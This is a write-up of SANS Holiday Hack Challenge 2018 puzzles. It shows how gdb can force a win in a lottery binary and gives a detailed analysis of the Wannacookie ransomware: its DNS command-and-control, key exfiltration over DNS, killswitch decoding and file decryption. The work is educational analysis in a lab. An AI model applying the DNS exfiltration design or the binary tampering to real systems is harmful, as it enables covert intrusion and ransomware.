<p>Hi, I'm Shinny Upatree.
Hey! Mind giving ole' Shinny Upatree some help? There's a contest I HAVE to win.
As long as no one else wins first, I can just keep trying to win the Sleigh Bell Lotto, but this could take forever!
I'll bet the GNU Debugger can help us. With the PEDA modules installed, it can be prettier. I mean easier.</p>
</blockquote>
<pre><code>I'll hear the bells on Christmas Day
Their sweet, familiar sound will play
  But just one elf,
  Pulls off the shelf,
The bells to hang on Santa's sleigh!

Please call me Shinny Upatree
I write you now, 'cause I would be
  The one who gets -
  Whom Santa lets
The bells to hang on Santa's sleigh!

But all us elves do want the job,
Conveying bells through wint'ry mob
  To be the one
  Toy making's done
The bells to hang on Santa's sleigh!

To make it fair, the Man devised
A fair and simple compromise.
  A random chance,
  The winner dance!
The bells to hang on Santa's sleigh!

Now here I need your hacker skill.
To be the one would be a thrill!
  Please do your best,
  And rig this test
The bells to hang on Santa's sleigh!

Complete this challenge by winning the sleighbell lottery for Shinny Upatree.
</code></pre>

<p>Based on the conversation with Shinny and the logon message, our goal for this exercise is to manipulate the <code>sleighbell-lotto</code> program   into letting us win the lottery. Our first step is to see what is available to us and how the program runs. </p>
<pre><code>elf@95d7e6283d56:~$ ls -lah
total 60K
drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:22 .
drwxr-xr-x 1 root root 4.0K Dec 14 16:21 ..
-rw-r--r-- 1 elf  elf   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elf  elf  3.7K Dec 14 16:21 .bashrc
-rw-r--r-- 1 elf  elf   807 Apr  4  2018 .profile
lrwxrwxrwx 1 elf  elf    12 Dec 14 16:21 gdb -&gt; /usr/bin/gdb
lrwxrwxrwx 1 elf  elf    16 Dec 14 16:21 objdump -&gt; /usr/bin/objdump
-rwxr-xr-x 1 root root  38K Dec 14 16:22 sleighbell-lotto
elf@95d7e6283d56:~$ ./sleighbell-lotto

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 3228!

Sorry - better luck next year!
elf@95d7e6283d56:~$ ./sleighbell-lotto

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 8298!

Sorry - better luck next year!
</code></pre>

<p>From this, we see that the program generates a random integer on each run and compares it with the integer <strong>1225</strong>. We also can use the debugging tools <code>gdb</code> and <code>objdump</code>.  Our first step is to analyze the program using <code>objdump</code> to gain insight into its procedure.</p>
<pre><code>elf@949e7def2ab2:~$ objdump -x sleighbell-lotto | grep .text       
[...snip...]
0000000000000f18 g F .text  00000000000000bf tohex
0000000000000fd7 g F .text  00000000000004e0 winnerwinner
0000000000000b0a g F .text  00000000000000c2 hmac_sha256
0000000000000c43 g F .text  00000000000002d5 base64_decode
00000000000015b0 g F .text  0000000000000065 __libc_csu_init
0000000000000c1e g F .text  0000000000000025 base64_cleanup
00000000000014b7 g F .text  0000000000000013 sorry
0000000000000bcc g F .text  0000000000000052 build_decoding_table
00000000000014ca g F .text  00000000000000e1 main
</code></pre>

<p>Two functions here are important to the task, the <code>winnerwinner</code> function and the <code>main</code> function; each of which plays a key role in a solution. After a quick analysis, we know of two possible solutions for this exercise:</p>
<ol>
<li>Changing the drawing's value to 1225.</li>
<li>Jumping straight to the <code>winnerwinner</code> function.</li>
</ol>
<h5 id="changing-the-drawings-value">Changing the Drawing's Value<a class="headerlink" href="#changing-the-drawings-value" title="Permanent link">&para;</a></h5>
<p>When we're able to use <code>gdb</code>, changing values of variables is a relatively trivial task. We first need to figure out where in memory our variable is, and then we simply set its value to 1225. To start, we load <code>sleighbell-lotto</code> into <code>gdb</code> and then run it once to allow us to set breakpoints in future executions.</p>
<pre><code>elf@95d7e6283d56:~$ gdb sleighbell-lotto
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
[...snip...]
(gdb) run
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 5850!

Sorry - better luck next year!
[Inferior 1 (process 31) exited normally]
</code></pre>

<p>Our next step is to determine where the program performs the comparison between the drawn number and 1225. We call <code>disassemble main</code> in order to examine the <code>main</code> function and see if any comparison operations match what we're looking for. The key identifier will be a comparison between a variable and 1225, or 0x4c9 in hex. After looking through <code>main</code>, the operation at <code>&lt;+184&gt;</code> appears to match what we need.</p>
<pre><code>(gdb) disassemble main
Dump of assembler code for function main:
   0x00005555555554ca &lt;+0&gt;:     push   %rbp
   0x00005555555554cb &lt;+1&gt;:     mov    %rsp,%rbp
   0x00005555555554ce &lt;+4&gt;:     sub    $0x10,%rsp
[...snip...]
   0x000055555555556c &lt;+162&gt;:   mov    $0x0,%eax
   0x0000555555555571 &lt;+167&gt;:   callq  0x5555555548f0 &lt;printf@plt&gt;
   0x0000555555555576 &lt;+172&gt;:   lea    0x584a(%rip),%rdi        # 0x55555555adc7
   0x000055555555557d &lt;+179&gt;:   callq  0x555555554910 &lt;puts@plt&gt;
   0x0000555555555582 &lt;+184&gt;:   cmpl   $0x4c9,-0x4(%rbp)
   0x0000555555555589 &lt;+191&gt;:   jne    0x555555555597 &lt;main+205&gt;
   0x000055555555558b &lt;+193&gt;:   mov    $0x0,%eax
   0x0000555555555590 &lt;+198&gt;:   callq  0x555555554fd7 &lt;winnerwinner&gt;
   0x0000555555555595 &lt;+203&gt;:   jmp    0x5555555555a1 &lt;main+215&gt;
   0x0000555555555597 &lt;+205&gt;:   mov    $0x0,%eax
   0x000055555555559c &lt;+210&gt;:   callq  0x5555555554b7 &lt;sorry&gt;
   0x00005555555555a1 &lt;+215&gt;:   mov    $0x0,%edi
   0x00005555555555a6 &lt;+220&gt;:   callq  0x555555554920 &lt;exit@plt&gt;
End of assembler dump.
</code></pre>

<p>Our next step is to set a breakpoint at that line, in order to let us change the variable's value before the program performs the comparison.</p>
<pre><code>(gdb) break *0x0000555555555582
Breakpoint 1 at 0x555555555582
(gdb) run  
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 309!


Breakpoint 1, 0x0000555555555582 in main ()
</code></pre>

<p>Now, we can set the value of the compared number to 1225 in order to force a win condition.</p>
<pre><code>(gdb) x $rbp-0x4
0x7fffffffe5fc: 0x00000135
(gdb) set {int}($rbp-0x4)=1225
(gdb) x $rbp-0x4
0x7fffffffe5fc: 0x000004c9
</code></pre>

<p>Since the drawn number now equals the winning number, we can continue the program to see the win screen.</p>
<pre><code>(gdb) continue
Continuing.

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
[Inferior 1 (process 35) exited normally]
</code></pre>

<h5 id="jumping-to-the-winnerwinner-function">Jumping to the 'winnerwinner' function.<a class="headerlink" href="#jumping-to-the-winnerwinner-function" title="Permanent link">&para;</a></h5>
<p>This method is, arguably, much simpler than the previous method. Rather than attempting to change the value of the drawn number, we just jump to the win screen held in the <code>winnerwinner</code> function. We can do this within <code>gdb</code> through two commands. <code>start</code> lets us begin execution but pauses the program so we can perform the jump. <code>jump winnerwinner</code> performs the actual jump. After this, we immediately see the win screen.</p>
<pre><code>(gdb) start
Temporary breakpoint 1 at 0x5555555554ce
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.

Temporary breakpoint 1, 0x00005555555554ce in main ()
(gdb) jump winnerwinner      
Continuing at 0x555555554fdb.

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
[Inferior 1 (process 62) exited normally]
</code></pre>

<blockquote>
<p>Sweet candy goodness - I win! Thank you so much!
Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie?
Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted.
Many elves were affected, so Alabaster went to go see if he could help out.
I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer.
An elf I follow online said he analyzed Wannacookie and that it communicates over DNS.
He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way.
Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie!
Of course, this all depends how the key was encrypted and managed in memory. Proper public key encryption requires a private key to decrypt.
Perhaps there is a flaw in the wannacookie author's DNS server that we can manipulate to retrieve what we need.
If so, we can retrieve our keys from memory, decrypt the key, and then decrypt our ransomed files.</p>
<p>- Shinny Upatree</p>
</blockquote>
<h3 id="appendix">Appendix<a class="headerlink" href="#appendix" title="Permanent link">&para;</a></h3>
<h4 id="a-google-ventilation-maze">A. Google Ventilation Maze<a class="headerlink" href="#a-google-ventilation-maze" title="Permanent link">&para;</a></h4>
<p>Previously, we found two ventilation maps during Challenge 4. By using these maps, we can navigate within the building's vents in order to access the Santa's Secret Room without hacking the badge scanner in Challenge 6. We can access the vents through the grate next to Google's booth in the entrance-way on the first floor.</p>
<p><img alt="Location" src="vent/vent-location.png" /></p>
<p>After clicking on the vent, we are greeted with an instructional screen and a 3D-maze.</p>
<p><img alt="Maze Instructions" src="vent/vent-maze.png" /></p>
<p>By using these maps, we can navigate our way through both floors in order to reach Santa's Secret Room.</p>
<p><img alt="Map 1F" src="vent/ventilation_diagram_1F.jpg" /></p>
<p><img alt="Map 2F" src="vent/ventilation_diagram_2F.jpg" /></p>
<p>Despite having a map, it becomes very easy to lose our heading and our current location. However, we can use <em>Chrome's DevTools</em> to see both of these in order to ensure we don't get lost. Each movement sends a POST request to https://vents.kringlecastle.com/move, which replies back with several files that the client browser uses to draw the current location and heading. By examining the response file named <code>move</code>, we can find our heading, X and Y location, and current floor as values in the file.</p>
<p><img alt="DevTools" src="vent/vent-devtools.png" /></p>
<p>Starting from the bottom right of the first floor, the proper route of each floor is:</p>
<p><img alt="Solution 1F" src="vent/ventilation_diagram_1F-solved.jpg" /></p>
<p><img alt="Solution  2F" src="vent/ventilation_diagram_2F-solved.jpg" /></p>
<h4 id="b-wannacookie-malware-analysis">B. Wannacookie Malware Analysis<a class="headerlink" href="#b-wannacookie-malware-analysis" title="Permanent link">&para;</a></h4>
<p><em>Wannacookie</em> is a highly-targeted form of ransomware aimed at two specific targets: Computers on the <code>KRINGLECASTLE</code> domain, and <code>.elfdb</code> files. This makes the malware fairly harmless to any other system. However, it uses a novel form of command and control (CnC) to transfer binary data through domain name system (DNS) requests, which still makes this an interesting piece of malware to analyze.</p>
<p>Provided is a high-level walkthrough of <em>Wannacookie's</em> infection and destruction process. The detailed analysis follows this chart.</p>
<p><img alt="Wannacookie Flowchart" src="wannacookie/wc-flowchart.png" /></p>
<p>To fully analyze the behavior of <em>Wannacookie</em>, we first spin up a Windows 10 virtual machine to see the execution of the malware in a controlled environment. We will run the <em>PowerShell</em> script directly, rather than from the <code>CHOCOLATE_CHIP_COOKIE_RECIPE.docm</code> file since this VM doesn't have access to <em>Microsoft Word</em>.
There are several factors to <em>Wannacookie</em> that makes it relatively safe to analyze:
- It does not seek out other computers to infect, so it's not virulent.
- It only targets files with the <code>.elfdb</code> extension, which is designed solely for the purpose of the <em>SANS Holiday Hack Challenge 2018</em> and not used for real-world data.</p>
<p>Our first attempt to run <em>Wannacookie</em> fails since we are not on a <code>KRINGLECASTLE</code> domain. In order to allow us to see its full execution, we remove the safety switch.</p>
<p><img alt="Running" src="wannacookie/wc-running.png" /></p>
<p>During the malware's execution, it retrieves data over the DNS in a novel way. It first makes a request to the DNS CnC server with a hex-encoded string as the subdomain. If it's requesting a file, then the server responds with a length value within the TXT record. Due to the limitations of DNS records, the server can only reply with 254-char, or 127-byte, chunks. Thus, the malware uses the initial length value to know how many requests it needs to make to retrieve the full file. After retrieving the length value, the malware makes several DNS requests, in sequence, with the format of: <code>&lt;chunk_number&gt;.&lt;requested_file&gt;.erohetfanu.com</code>. The <code>chunk_number</code> increments from 0 to one less than the specified length from before. For each request, the server replies with a portion of the file as a hex string within the TXT record. Upon completing all DNS requests, the malware has downloaded the full file from the CnC server.</p>
<p><img alt="A DNS Download" src="wannacookie/wc-dnsdownload.png" /></p>
<p>The script takes the following actions:
1.  Performs the killswitch check. The malware generates a domain to lookup through several novel techniques that attempt to obfuscate its methods and the resulting domain name.
    -  It first retreives a hex string from the TXT record of <code>6B696C6C737769746368.erohetfanu.com</code> (the hex subdomain translating to <code>killswitch</code>), which is an encrypted value that contains the killswitch domain name: <code>66667272727869657268667865666B73</code>
    -  Another variable, <code>$S1</code>, contains a hex string of gzip data that the malware translates all the way to the hex-values of its unzipped contents; an XOR key for the previous value: <code>1f0f0202171d020c0b09075604070a0a</code>
    -  Finally, the script performs an XOR operation between the two values to decrypt the domain name used as a killswitch: <code>yippeekiyaa.aaay</code>
    -  The script attempts to resolve this domain name and if successful, halts further operation.</p>
<ol>
<li>
<p>Checks if the target is within the <code>KRINGLECASTLE</code> domain and has TCP port 8080 open on localhost. If either of these are not true, then the script exits.</p>
</li>
<li>
<p>Retrieves the CnC server's public key via DNS. This request is formatted as:</p>
<ul>
<li><code>7365727665722E637274.erohetfanu.com</code>. The subdomain is hex, which translates to <code>server.crt</code>. The server replys in the TXT record with how many subsequent requests the script should make.</li>
</ul>
</li>
<li>
<p>Generates a random, 256-bit encryption key along with a SHA1 hash of a hex version of that key.</p>
</li>
<li>
<p>Encrypts the key with the server's public key and sends it to the CnC server over DNS. After asymmetric encryption, the key ends up being 2048-bits long. After the first submission, the CnC server sends back a random, 20-byte ID number for that key, known by the program as a "Cookie ID".</p>
<ul>
<li>Based upon limits of DNS requests, the script breaks up the encrypted key into 128-bit (32 char) chunks and sends each chunk sequentially.</li>
<li>The DNS requests are formatted like:<ul>
<li>First chunk as <code>chunk.6B6579666F72626F746964.erohetfanu.com</code>. Where the hex translates to <code>keyforbotid</code>. In return, the server provides the 20-byte "Cookie ID" within the TXT record.</li>
<li>All subsequent chunks as <code>cookie_id.chunk.6B6579666F72626F746964.erohetfanu.com</code>. The server replys with a blank TXT record for these requests.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Afterwards, it creates a timestamp of the current time in order to serve a deadline for the victim with the ransom note.</p>
</li>
<li>
<p>It then gathers a list of files with the <code>.elfdb</code> file extension within the Desktop, Documents, Videos, Pictures, and Music folders for that user, additionally ignoring files with <code>.wannacookie</code> as an extension.</p>
</li>
<li>
<p>Using that file list, the script encrypts each file using the generated key in AES CBC mode, while also generating the IV for that file.</p>
<ul>
<li>The IV's length is stored within the first four bytes (a 32-bit integer) of the encrypted file, with the actual IV following it, in order to allow the script to later decrypt it with only the key.</li>
</ul>
</li>
<li>
<p>After completing the encryption process, it retrieves an HTML file from the CnC server via DNS and starts a local HTTP server on port 8080. This server provides the ransom note to the victim and instructions on how to pay and decrypt their files.</p>
</li>
</ol>
<p>We notice the file's execution taking an exceptionally long amount of time, this is due to the malware downloading <code>source.min.html</code> over DNS from <code>erohetfanu.com</code>, and then having to translate it to ASCII. After completing the decoding process, the script starts an HTTP server on port 8080.</p>
<p><img alt="Ransom" src="wannacookie/wc-ransomnote.png" /></p>
<p>The ransom note application checks for payment upon every refresh via the <code>cookie_is_paid</code> resource. This causes the application to send a DNS request to the CnC server in the format of <code>cookie_id.72616e736f6d697370616964.erohetfanu.com</code>. The CnC server replies with a hex string in the TXT record that translates to <code>False</code>. By analyzing the script, we see that the server would reply with a 32 character hex-string if it believes its been paid, which is most likely the encryption key.</p>
<p>The decrypt function uses the previously calculated SHA-1 hash to check if the victim enters the correct key. If it validates the key, then it gathers all <code>.wannacookie</code> files and performs the decryption process. Since we recorded the network traffic during the exploitation process and have the server's private key in hand, we can simply decrypt the submitted key and perform the decryption process, without checking for payment with the CnC server.</p>
<p><img alt="Key Send Traffic" src="wannacookie/wc-encryptedkeysend.png" /></p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ cat VM_encrypted_key.txt
008f9236b701c97fcdbd159d1c189a9841e85a73c8a8a7e69dae459e50ec0101a71
f00c9cf0bc59c04065085da7d5fa2e1f748fe9ff8fc77fe09510f0e8496c062fe20
e30b4e614000e9e2befe126b4fcea88adc602c05041a4c74344eb7bedd46f4ccbca
beb1fc54b8fb1ab519b35a2348ee4c7368db8561eb0488894975466e7b2415617a4
4175b9a1745cfed6b2dfebc2c5eec4ada3b3a78910384be7d074dd5f08ea87a6f9e
4107df89b1d1fdd9da7b7110d0c29ff443e7e7259e3ac6e3755f635690f8c71529f
67998d0aa3d159ce9d14789022c55de0e3991cee7c2fb103dc01db82d4b4516b6ac
4b96bb37809477f2d509823612a6cdc853471816fde

bernard@Bernard-PC:~/NetsecStudy/sans2018$ cat VM_encrypted_key.txt | xxd -r -p &gt; VM_encrypted_key.key

bernard@Bernard-PC:~/NetsecStudy/sans2018$ openssl rsautl -decrypt -oaep -in VM_encrypted_key.key -out VM_key.key -inkey server.key

bernard@Bernard-PC:~/NetsecStudy/sans2018$ ls -lah VM_key.key
-rwxrwxrwx 1 bernard bernard 16 Dec 28 15:42 VM_key.key

bernard@Bernard-PC:~/NetsecStudy/sans2018$ xxd -p VM_key.key
c5a6236a762ecfbf935b428d43eae4c7
</code></pre>

<p>Now, by submitting <code>c5a6236a762ecfbf935b428d43eae4c7</code> as the decrypt key into the <em>Wannacookie</em> application, we can initiate the decryption process and recover our file.</p>
<p><img alt="Input Key" src="wannacookie/wc-keydecryption.png" /></p>
<p><img alt="Decryption" src="wannacookie/wc-decrypted.png" /></p>
<p>After completing the decryption process, the script ends and shuts down the HTTP server.</p>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
  <div class="md-footer-social">
    <link rel="stylesheet" href="assets/fonts/font-awesome.css">
    
      <a href="https://github.com/bernardsmith0892/" class="md-footer-social__link fa fa-github"></a>
    
      <a href="https://twitter.com/BernardSmith892" class="md-footer-social__link fa fa-twitter"></a>
    
      <a href="https://www.linkedin.com/in/bernard-smith-27324257/" class="md-footer-social__link fa fa-linkedin"></a>
    
  </div>

      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="assets/javascripts/application.b41f3d20.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"."}})</script>
      
    
    
      
    
  </body>
</html>